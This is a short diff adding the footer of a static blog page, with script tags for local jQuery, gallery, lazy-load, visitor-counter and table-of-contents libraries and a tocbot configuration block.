+  <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="/js/tocbot.min.js"></script>
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+</html>
